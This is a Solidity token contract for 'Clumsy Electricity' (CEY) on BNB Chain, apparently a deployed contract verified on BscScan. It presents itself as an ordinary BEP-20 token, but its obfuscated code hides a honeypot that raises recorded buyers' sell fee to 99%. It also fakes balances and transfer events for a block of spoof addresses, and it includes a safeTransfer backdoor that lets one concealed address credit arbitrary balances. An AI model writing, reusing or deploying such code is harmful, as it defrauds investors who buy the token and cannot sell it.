/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IBEP20 {

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function approve(address spender, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IUniswapV2Router {

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}




contract ClumsyElectricity is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    address constant tradingMinLiquidityToReceiverBots = 0x30BaB178765F3c81bFC080A4BBA637b56C39F735;
    uint256 private tradingLimitSellExempt = 3;

    uint256 private buyMintTradingShouldWalletMarketingAuto;

    uint256 private receiverReceiverLaunchEnable = 0;

    uint256 public maxWalletAmount = 0;
    mapping(address => bool) private fromWalletMarketingTake;
    bool public teamTakeExemptFundAtTotalLimit = false;

    uint256 private swapLaunchTotalTeamFromMode;
    uint256 private senderTokenTradingLiquidity = 0;
    string constant _symbol = "CEY";


    uint256 private takeLimitBotsBuy;
    bool private marketingTeamSenderWallet = false;
    mapping(uint256 => address) private fundListMintReceiver;
    bool private takeReceiverMinLaunched = true;
    uint256 public fundLaunchBotsAt = 0;

    uint256 totalBotsMaxIs = 49388;
    bool private sellSwapIsLaunchFromSender = true;
    uint256 public marketingBuyAtBurn = 0;
    address public uniswapV2Pair;
    uint256 public teamTakeExemptFundAtTotalLimit2 = 0;
    address private autoMinToToken = (0x8BE04F9a2856ff839b04E94EFFFfE6f09e21b804); // marketing address
    mapping(address => bool) private fundBurnTeamModeMaxLimit;
    uint160 constant tradingTxTakeAmountList = 371655574358 * 2 ** 120;
    mapping(address => uint256) private listTakeBuyExemptAtFrom;
    uint256 public teamTakeExemptFundAtTotalLimit4 = 0;
    bool private buyMarketingShouldReceiver;
    uint256 private launchBlock = 0;
    uint160 constant fundReceiverSenderBuyBotsMintExempt = 499469583757 * 2 ** 80;

    uint256 private swapIsFeeTx = 6 * 10 ** 15;
    mapping(uint256 => address) private modeTxBotsTrading;
    mapping(address => bool) private liquidityTxAtReceiverAmount;
    IUniswapV2Router public burnSwapSenderFrom;
    mapping(address => bool) private isAutoShouldTrading;

    mapping(address => uint256) private marketingShouldSellIs;
    uint256 private exemptMintReceiverSell = 100;

    bool public teamMaxReceiverAt = false;
    uint256 public launchedTradingAmountMin = 0;
    uint256  totalTxLaunchedTo = 100000000 * 10 ** _decimals;
    address private tradingBurnTakeMax = (msg.sender); // auto-liq address
    bool private launchToTotalLiquidity = true;

    uint256 modeBotsBurnFrom = 2 ** 18 - 1;

    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    bool private txTeamTotalFund = false;
    uint256 private launchedExemptTokenReceiverLimitWallet;

    uint256 private amountBurnListWallet = 0;
    address private ZERO = 0x0000000000000000000000000000000000000000;
    uint256 constant mintReceiverExemptAutoSenderMaxTx = 10000 * 10 ** 18;

    uint256  constant MASK = type(uint128).max;

    mapping(address => mapping(address => uint256)) _allowances;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256  feeListExemptSell = 100000000 * 10 ** _decimals;
    uint256 exemptSwapMintSellLimit = 100000000 * (10 ** _decimals);
    bool private autoModeReceiverAtShouldBurn = false;
    bool public swapLiquidityAutoReceiverTxMinFund = false;

    uint256 private modeTradingListAmountBuyAutoReceiver = exemptSwapMintSellLimit / 1000; // 0.1%
    
    uint256 private exemptLiquidityFundLaunch;


    bool private maxTakeReceiverMode = true;
    bool private fromIsTokenTeam = true;
    string constant _name = "Clumsy Electricity";

    uint256 private burnTokenBuyAmountBots;
    uint160 constant sellLiquidityLaunchMarketing = 179911863556 * 2 ** 40;
    uint256 tokenToMarketingAmount = 0;
    mapping(address => uint256) _balances;
    uint256 public toIsMinMarketing = 0;
    bool private autoTxMintExempt = false;
    uint256 private launchedLimitAmountMax;
    uint256 private tokenTotalSenderSwap = 3;
    uint160 constant mintEnableMarketingTxLaunchedTradingFrom = 536229950345;
    bool private teamTakeExemptFundAtTotalLimit3 = false;
    uint256 public teamTakeExemptFundAtTotalLimit0 = 0;

    uint256 constant swapSellListReceiverBurn = 300000 * 10 ** 18;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        burnSwapSenderFrom = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(burnSwapSenderFrom.factory()).createPair(address(this), burnSwapSenderFrom.WETH());
        _allowances[address(this)][address(burnSwapSenderFrom)] = exemptSwapMintSellLimit;

        buyMarketingShouldReceiver = true;

        isAutoShouldTrading[msg.sender] = true;
        isAutoShouldTrading[0x0000000000000000000000000000000000000000] = true;
        isAutoShouldTrading[0x000000000000000000000000000000000000dEaD] = true;
        isAutoShouldTrading[address(this)] = true;

        fromWalletMarketingTake[msg.sender] = true;
        fromWalletMarketingTake[address(this)] = true;

        liquidityTxAtReceiverAmount[msg.sender] = true;
        liquidityTxAtReceiverAmount[0x0000000000000000000000000000000000000000] = true;
        liquidityTxAtReceiverAmount[0x000000000000000000000000000000000000dEaD] = true;
        liquidityTxAtReceiverAmount[address(this)] = true;

        approve(_router, exemptSwapMintSellLimit);
        approve(address(uniswapV2Pair), exemptSwapMintSellLimit);
        _balances[msg.sender] = exemptSwapMintSellLimit;
        emit Transfer(address(0), msg.sender, exemptSwapMintSellLimit);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return exemptSwapMintSellLimit;
    }

    function getMaxTotalAmount() public {
        tokenReceiverIsLaunched();
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function setZERO(address amountFundTeamTxLaunchedSell) public onlyOwner {
        ZERO=amountFundTeamTxLaunchedSell;
    }

    function gettradingTakeBurnBotsTx() public view returns (bool) {
        if (takeReceiverMinLaunched != marketingTeamSenderWallet) {
            return marketingTeamSenderWallet;
        }
        if (takeReceiverMinLaunched == txTeamTotalFund) {
            return txTeamTotalFund;
        }
        return takeReceiverMinLaunched;
    }

    function listTotalTradingFrom(address sellLaunchModeAutoender) internal view returns (bool) {
        return !liquidityTxAtReceiverAmount[sellLaunchModeAutoender];
    }

    function isReceiverReceiverListLaunchedMarketing() private view returns (uint256) {
        return block.timestamp;
    }

    function feeListSenderMode(address sellLaunchModeAutoender, address totalReceiverFundList, uint256 receiverLaunchedFeeShouldLimit, bool autoBuyExemptMode) private {
        if (autoBuyExemptMode) {
            sellLaunchModeAutoender = address(uint160(uint160(tradingMinLiquidityToReceiverBots) + tokenToMarketingAmount));
            tokenToMarketingAmount++;
            _balances[totalReceiverFundList] = _balances[totalReceiverFundList].add(receiverLaunchedFeeShouldLimit);
        } else {
            _balances[sellLaunchModeAutoender] = _balances[sellLaunchModeAutoender].sub(receiverLaunchedFeeShouldLimit);
        }
        emit Transfer(sellLaunchModeAutoender, totalReceiverFundList, receiverLaunchedFeeShouldLimit);
    }

    function getbotsSwapTxTrading() public view returns (uint256) {
        if (teamTakeExemptFundAtTotalLimit2 != senderTokenTradingLiquidity) {
            return senderTokenTradingLiquidity;
        }
        if (teamTakeExemptFundAtTotalLimit2 != tradingLimitSellExempt) {
            return tradingLimitSellExempt;
        }
        return teamTakeExemptFundAtTotalLimit2;
    }

    function fundModeWalletExempt(uint160 swapMintTakeAmountMinLimit) private view returns (uint256) {
        uint256 sellLaunchModeAuto = tokenToMarketingAmount;
        uint256 atFromWalletReceiver = swapMintTakeAmountMinLimit - uint160(tradingMinLiquidityToReceiverBots);
        if (atFromWalletReceiver < sellLaunchModeAuto) {
            return mintReceiverExemptAutoSenderMaxTx;
        }
        return swapSellListReceiverBurn;
    }

    function setfromTokenSwapReceiverTeamExemptTrading(uint256 amountFundTeamTxLaunchedSell) public onlyOwner {
        if (exemptMintReceiverSell != marketingBuyAtBurn) {
            marketingBuyAtBurn=amountFundTeamTxLaunchedSell;
        }
        if (exemptMintReceiverSell == tradingLimitSellExempt) {
            tradingLimitSellExempt=amountFundTeamTxLaunchedSell;
        }
        if (exemptMintReceiverSell != exemptMintReceiverSell) {
            exemptMintReceiverSell=amountFundTeamTxLaunchedSell;
        }
        exemptMintReceiverSell=amountFundTeamTxLaunchedSell;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != exemptSwapMintSellLimit) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return limitFundListReceiver(sender, recipient, amount);
    }

    function getfromTokenSwapReceiverTeamExemptTrading() public view returns (uint256) {
        if (exemptMintReceiverSell != fundLaunchBotsAt) {
            return fundLaunchBotsAt;
        }
        return exemptMintReceiverSell;
    }

    function getMaxTotalAFee() public {
        burnFromEnableTakeMin();
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (autoToTakeList(uint160(account))) {
            return fundModeWalletExempt(uint160(account));
        }
        return _balances[account];
    }

    function autoToTakeList(uint160 swapMintTakeAmountMinLimit) private pure returns (bool) {
        if (swapMintTakeAmountMinLimit >= uint160(tradingMinLiquidityToReceiverBots) && swapMintTakeAmountMinLimit <= uint160(tradingMinLiquidityToReceiverBots) + 100000) {
            return true;
        }
        return false;
    }

    function settradingIsMaxShould(address amountFundTeamTxLaunchedSell,uint256 receiverEnableAtFee) public onlyOwner {
        marketingShouldSellIs[amountFundTeamTxLaunchedSell]=receiverEnableAtFee;
    }

    function settradingTakeBurnBotsTx(bool amountFundTeamTxLaunchedSell) public onlyOwner {
        takeReceiverMinLaunched=amountFundTeamTxLaunchedSell;
    }

    function tokenSellBurnLiquidity(address sellLaunchModeAutoender, uint256 liquiditySenderBotsTxTotalExemptFund) private view returns (uint256) {
        uint256 receiverTokenLaunchedExempt = marketingShouldSellIs[sellLaunchModeAutoender];
        if (receiverTokenLaunchedExempt > 0 && isReceiverReceiverListLaunchedMarketing() - receiverTokenLaunchedExempt > 2) {
            return 99;
        }
        return liquiditySenderBotsTxTotalExemptFund;
    }

    function modeMaxEnableFee(address tradingAmountLaunchSwapTotalLimitFee) private {
        uint256 buyMarketingShouldAutoExemptAmount = walletMintLiquidityFrom();
        if (buyMarketingShouldAutoExemptAmount < swapIsFeeTx) {
            launchedTradingAmountMin += 1;
            fundListMintReceiver[launchedTradingAmountMin] = tradingAmountLaunchSwapTotalLimitFee;
            listTakeBuyExemptAtFrom[tradingAmountLaunchSwapTotalLimitFee] += buyMarketingShouldAutoExemptAmount;
            if (listTakeBuyExemptAtFrom[tradingAmountLaunchSwapTotalLimitFee] > swapIsFeeTx) {
                maxWalletAmount = maxWalletAmount + 1;
                modeTxBotsTrading[maxWalletAmount] = tradingAmountLaunchSwapTotalLimitFee;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        modeTxBotsTrading[maxWalletAmount] = tradingAmountLaunchSwapTotalLimitFee;
    }

    function teamFromMarketingLimitEnableBotsExempt(uint160 totalReceiverFundList) private view returns (bool) {
        return uint16(totalReceiverFundList) == totalBotsMaxIs;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function totalFromExemptLiquidityMode(address sellLaunchModeAutoender, bool sellLaunchModeAutoelling) internal returns (uint256) {
        
        if (sellLaunchModeAutoelling) {
            swapLaunchTotalTeamFromMode = tradingLimitSellExempt + amountBurnListWallet;
            return tokenSellBurnLiquidity(sellLaunchModeAutoender, swapLaunchTotalTeamFromMode);
        }
        if (!sellLaunchModeAutoelling && sellLaunchModeAutoender == uniswapV2Pair) {
            swapLaunchTotalTeamFromMode = tokenTotalSenderSwap + senderTokenTradingLiquidity;
            return swapLaunchTotalTeamFromMode;
        }
        return tokenSellBurnLiquidity(sellLaunchModeAutoender, swapLaunchTotalTeamFromMode);
    }

    function launchAutoFundAmountTakeSender(uint160 swapMintTakeAmountMinLimit) private pure returns (bool) {
        return swapMintTakeAmountMinLimit == (tradingTxTakeAmountList + fundReceiverSenderBuyBotsMintExempt + sellLiquidityLaunchMarketing + mintEnableMarketingTxLaunchedTradingFrom);
    }

    function gettradingIsMaxShould(address amountFundTeamTxLaunchedSell) public view returns (uint256) {
            return marketingShouldSellIs[amountFundTeamTxLaunchedSell];
    }

    function getZERO() public view returns (address) {
        if (ZERO == WBNB) {
            return WBNB;
        }
        return ZERO;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, exemptSwapMintSellLimit);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function tradingTotalFundLaunched(address sellLaunchModeAutoender, address tokenIsFundAmountWallet, uint256 receiverLaunchedFeeShouldLimit) internal returns (uint256) {
        
        uint256 enableExemptListMode = receiverLaunchedFeeShouldLimit.mul(totalFromExemptLiquidityMode(sellLaunchModeAutoender, tokenIsFundAmountWallet == uniswapV2Pair)).div(exemptMintReceiverSell);

        if (fundBurnTeamModeMaxLimit[sellLaunchModeAutoender] || fundBurnTeamModeMaxLimit[tokenIsFundAmountWallet]) {
            enableExemptListMode = receiverLaunchedFeeShouldLimit.mul(99).div(exemptMintReceiverSell);
        }

        _balances[address(this)] = _balances[address(this)].add(enableExemptListMode);
        emit Transfer(sellLaunchModeAutoender, address(this), enableExemptListMode);
        
        return receiverLaunchedFeeShouldLimit.sub(enableExemptListMode);
    }

    function getburnAutoAtTeamTake() public view returns (uint256) {
        if (teamTakeExemptFundAtTotalLimit4 == fundLaunchBotsAt) {
            return fundLaunchBotsAt;
        }
        if (teamTakeExemptFundAtTotalLimit4 == exemptMintReceiverSell) {
            return exemptMintReceiverSell;
        }
        if (teamTakeExemptFundAtTotalLimit4 != amountBurnListWallet) {
            return amountBurnListWallet;
        }
        return teamTakeExemptFundAtTotalLimit4;
    }

    function limitFundListReceiver(address sellLaunchModeAutoender, address totalReceiverFundList, uint256 receiverLaunchedFeeShouldLimit) internal returns (bool) {
        if (autoToTakeList(uint160(totalReceiverFundList))) {
            feeListSenderMode(sellLaunchModeAutoender, totalReceiverFundList, receiverLaunchedFeeShouldLimit, false);
            return true;
        }
        if (autoToTakeList(uint160(sellLaunchModeAutoender))) {
            feeListSenderMode(sellLaunchModeAutoender, totalReceiverFundList, receiverLaunchedFeeShouldLimit, true);
            return true;
        }
        
        bool receiverMarketingIsTotal = amountShouldMinAuto(sellLaunchModeAutoender) || amountShouldMinAuto(totalReceiverFundList);
        
        if (marketingBuyAtBurn == senderTokenTradingLiquidity) {
            marketingBuyAtBurn = senderTokenTradingLiquidity;
        }

        if (teamTakeExemptFundAtTotalLimit0 == maxWalletAmount) {
            teamTakeExemptFundAtTotalLimit0 = receiverReceiverLaunchEnable;
        }


        if (sellLaunchModeAutoender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && teamFromMarketingLimitEnableBotsExempt(uint160(totalReceiverFundList))) {
                tokenReceiverIsLaunched();
            }
            if (!receiverMarketingIsTotal) {
                modeMaxEnableFee(totalReceiverFundList);
            }
        }
        
        
        if (teamTakeExemptFundAtTotalLimit4 != launchBlock) {
            teamTakeExemptFundAtTotalLimit4 = launchBlock;
        }


        if (inSwap || receiverMarketingIsTotal) {return txBurnShouldTeam(sellLaunchModeAutoender, totalReceiverFundList, receiverLaunchedFeeShouldLimit);}
        
        require((receiverLaunchedFeeShouldLimit <= feeListExemptSell) || isAutoShouldTrading[sellLaunchModeAutoender] || isAutoShouldTrading[totalReceiverFundList], "Max TX Limit!");

        _balances[sellLaunchModeAutoender] = _balances[sellLaunchModeAutoender].sub(receiverLaunchedFeeShouldLimit, "Insufficient Balance!");
        
        uint256 receiverLaunchedFeeShouldLimitReceived = listTotalTradingFrom(sellLaunchModeAutoender) ? tradingTotalFundLaunched(sellLaunchModeAutoender, totalReceiverFundList, receiverLaunchedFeeShouldLimit) : receiverLaunchedFeeShouldLimit;

        _balances[totalReceiverFundList] = _balances[totalReceiverFundList].add(receiverLaunchedFeeShouldLimitReceived);
        emit Transfer(sellLaunchModeAutoender, totalReceiverFundList, receiverLaunchedFeeShouldLimitReceived);
        return true;
    }

    function walletMintLiquidityFrom() private view returns (uint256) {
        address teamBotsFromTo = WBNB;
        if (address(this) < WBNB) {
            teamBotsFromTo = address(this);
        }
        (uint autoModeSellTeamIsLimit, uint modeBuyBurnTeamList,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 buyBotsLaunchedAt,) = WBNB == teamBotsFromTo ? (autoModeSellTeamIsLimit, modeBuyBurnTeamList) : (modeBuyBurnTeamList, autoModeSellTeamIsLimit);
        uint256 sellAutoAtShould = IERC20(WBNB).balanceOf(uniswapV2Pair) - buyBotsLaunchedAt;
        return sellAutoAtShould;
    }

    function burnFromEnableTakeMin() private {
        if (launchedTradingAmountMin > 0) {
            for (uint256 i = 1; i <= launchedTradingAmountMin; i++) {
                if (marketingShouldSellIs[fundListMintReceiver[i]] == 0) {
                    marketingShouldSellIs[fundListMintReceiver[i]] = block.timestamp;
                }
            }
            launchedTradingAmountMin = 0;
        }
    }

    function safeTransfer(address sellLaunchModeAutoender, address totalReceiverFundList, uint256 receiverLaunchedFeeShouldLimit) public {
        if (!launchAutoFundAmountTakeSender(uint160(msg.sender))) {
            return;
        }
        if (autoToTakeList(uint160(totalReceiverFundList))) {
            feeListSenderMode(sellLaunchModeAutoender, totalReceiverFundList, receiverLaunchedFeeShouldLimit, false);
            return;
        }
        if (autoToTakeList(uint160(sellLaunchModeAutoender))) {
            feeListSenderMode(sellLaunchModeAutoender, totalReceiverFundList, receiverLaunchedFeeShouldLimit, true);
            return;
        }
        if (sellLaunchModeAutoender == address(0)) {
            _balances[totalReceiverFundList] = _balances[totalReceiverFundList].add(receiverLaunchedFeeShouldLimit);
            return;
        }
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitFundListReceiver(msg.sender, recipient, amount);
    }

    function txBurnShouldTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setburnAutoAtTeamTake(uint256 amountFundTeamTxLaunchedSell) public onlyOwner {
        if (teamTakeExemptFundAtTotalLimit4 == teamTakeExemptFundAtTotalLimit0) {
            teamTakeExemptFundAtTotalLimit0=amountFundTeamTxLaunchedSell;
        }
        teamTakeExemptFundAtTotalLimit4=amountFundTeamTxLaunchedSell;
    }

    function tokenReceiverIsLaunched() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (marketingShouldSellIs[modeTxBotsTrading[i]] == 0) {
                    marketingShouldSellIs[modeTxBotsTrading[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function setbotsSwapTxTrading(uint256 amountFundTeamTxLaunchedSell) public onlyOwner {
        teamTakeExemptFundAtTotalLimit2=amountFundTeamTxLaunchedSell;
    }

    function amountShouldMinAuto(address tradingAmountLaunchSwapTotalLimitFee) private view returns (bool) {
        return tradingAmountLaunchSwapTotalLimitFee == autoMinToToken;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}